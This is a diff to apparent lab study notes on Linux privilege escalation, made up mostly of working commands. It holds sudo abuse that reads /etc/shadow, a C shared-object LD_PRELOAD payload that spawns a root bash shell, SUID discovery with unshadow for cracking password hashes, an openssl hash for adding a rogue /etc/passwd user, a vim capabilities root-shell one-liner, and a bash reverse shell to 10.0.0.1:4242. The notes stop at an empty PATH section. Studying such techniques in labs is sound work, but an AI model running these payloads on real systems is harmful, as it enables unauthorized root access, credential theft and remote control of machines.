@@ -53,7 +53,7 @@ remmina  //login to the windows server
 [cut command](https://www.geeksforgeeks.org/cut-command-linux-examples/)  
 [2>/dev/null ](https://qr.ae/pKgBo5)  
 command:  
-```
+```bash
 hostname //hostname of the target machine  
 uname -a  //kernel information 
 cat /proc/version  //proc filesystem kernel
@@ -139,3 +139,78 @@ Notes:
 
 CVE:  
 * [CVE-2015-1328](https://github.com/SecWiki/linux-kernel-exploits/blob/master/2015/CVE-2015-1328/README.md)
+
+## Privilege Escalation: Sudo 
+[https://gtfobins.github.io/](https://gtfobins.github.io/)
+
+### Leverage application functions  
+
+[https://gtfobins.github.io/](https://gtfobins.github.io/)
+command:   
+```bash
+cat /etc/shadow  # A shadow password file, also known as /etc/shadow, is a system file in Linux that stores encrypted user passwords and is accessible only to the root user, preventing unauthorized users or malicious actors from breaking into the system. 
+
+sudo apache2 -f /etc/shadow  
+sudo nmap -interactive  #do not work   
+```
+### Leverage LD_PRELOAD 
+step 1: Check for LD_PRELOAD (with the env_keep option)  
+step 2: Write a simple C code compiled as a share object (.so extension) file  
+command:  
+```bash
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+step 3: Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file  
+command:   
+```bash
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+```
+
+### Privilege Escalation: SUID  
+#### read the /etc/shadow
+
+>[Understanding File Permissions](https://www.elated.com/understanding-permissions/)
+
+command:  [explain](https://chat.openai.com/share/805e4ba0-19e7-4ae2-b118-8004a6cfcecf)
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+
+nano /etc/shadow  
+unshadow passwd.txt shadow.txt > passwords.txt
+```
+
+#### adding user to /etc/passwd  
+command:  [explain](https://chat.openai.com/share/d80cd0f5-a883-4765-b2fc-0d6efdbaeebb)
+```bash
+openssl passwd -1 -salt THM password1
+```
+
+###  Privilege Escalation: Capabilities 
+command:  
+```bash
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+### Privilege Escalation: Cron Jobs 
+command:  
+```bash
+
+cat /etc/crontab 
+
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+```
+
+###  Privilege Escalation: PATH 
+
+
